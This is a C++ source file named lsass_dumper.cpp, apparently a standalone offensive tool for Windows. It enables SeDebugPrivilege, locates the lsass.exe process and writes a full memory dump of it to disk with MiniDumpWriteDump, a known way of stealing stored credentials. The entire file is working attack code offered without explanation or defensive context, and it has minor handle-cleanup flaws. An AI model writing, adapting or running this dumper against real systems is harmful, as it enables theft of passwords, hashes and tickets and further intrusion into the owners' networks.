//// lsass_dumper.cpp : This file contains the 'main' function. Program execution begins and ends there.
////
#pragma comment(lib, "Dbghelp.lib")
#include <iostream>
#include "windows.h"
#include <tlhelp32.h>
#include <DbgHelp.h>

using namespace std;

bool is_elevated() 
{
    bool store_is_elevated = false;
    HANDLE access_token_handle;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &access_token_handle))
    {
        TOKEN_ELEVATION process_elevation;
        DWORD token_check = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(access_token_handle, TokenElevation, &process_elevation, sizeof(process_elevation), &token_check))
        {
            store_is_elevated = process_elevation.TokenIsElevated;
        }
        else
            cerr << "GetTokeninformation returned false\n";
    }
    if (store_is_elevated)
        return true;
    else
        return false;
    CloseHandle(access_token_handle);
}

DWORD get_process_ID(const wstring& process_name)
{
    DWORD processID = NULL;
    HANDLE process_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (process_snapshot != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 process_entry = {};
        process_entry.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(process_snapshot, &process_entry))
        {
            do {
                wstring current_process_name = process_entry.szExeFile;
                processID = process_entry.th32ProcessID;
                if (current_process_name == process_name)
                {
                    processID = process_entry.th32ProcessID;
                    break;
                }
            } while (Process32Next(process_snapshot, &process_entry));
        }
        return processID;
    }
    CloseHandle(process_snapshot);
}

bool set_privilege(string privilege_name)
{
    wstring privilege_name_wide(privilege_name.begin(), privilege_name.end());
    const wchar_t* priv_name_pointer = privilege_name_wide.c_str();
    TOKEN_PRIVILEGES privileges = { 0,0,0,0 };
    HANDLE handle = NULL;
    LUID luid = { 0,0 };
    bool status = true;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &handle))
    {
        status = false;
        goto EXIT;
    }
    if (!LookupPrivilegeValueW(0, priv_name_pointer, &luid))
    {
        status = false;
        goto EXIT;
    }
    privileges.PrivilegeCount = 1;
    privileges.Privileges[0].Luid = luid;
    privileges.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : SE_PRIVILEGE_REMOVED;
    if (!AdjustTokenPrivileges(handle, false, &privileges, 0, 0, 0))
    {
        status = false;
        goto EXIT;
    }
EXIT:
    if (handle)
    {
        CloseHandle(handle);
    }
    return status;
}
int main()
{
    if (is_elevated())
        cout << "[+] Has elevated privileges";
    else
        cout << "[-] dosent have elevated privileges";
    wstring process_name = L"lsass.exe";
    string privilege = "SeDebugPrivilege";
    DWORD PID = get_process_ID(process_name);
    wcout << "[+] PID of "<< process_name <<" is " << PID<< endl;
    if (set_privilege(privilege))
    {
        cout << "[+] " << privilege << " is set\n";
    }
    else
    {
        wcout << "[-] privilege is not set\n";
    }
    string filename = "lsass.dump";
    wstring stemp = wstring(filename.begin(), filename.end());
    LPCWSTR file_name_pointer = stemp.c_str();
    HANDLE file_handle = CreateFile(file_name_pointer,GENERIC_ALL,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
    DWORD access_allow = PROCESS_VM_READ | PROCESS_QUERY_INFORMATION;
    HANDLE process_handle = OpenProcess(access_allow, 0, PID);
    if (process_handle && process_handle != INVALID_HANDLE_VALUE)
    {
        bool is_dumped = MiniDumpWriteDump(process_handle, PID, file_handle, MiniDumpWithFullMemory, NULL, NULL, NULL);
        if (is_dumped)
        {
            cout << "[+] file dumped";
        }
        else
        {
            cout << "[-] file was not dumped";
        }
    }
    else
    {
        cout << "[-] failed";
    }
    CloseHandle(file_handle);
    CloseHandle(process_handle);
    getchar();
}

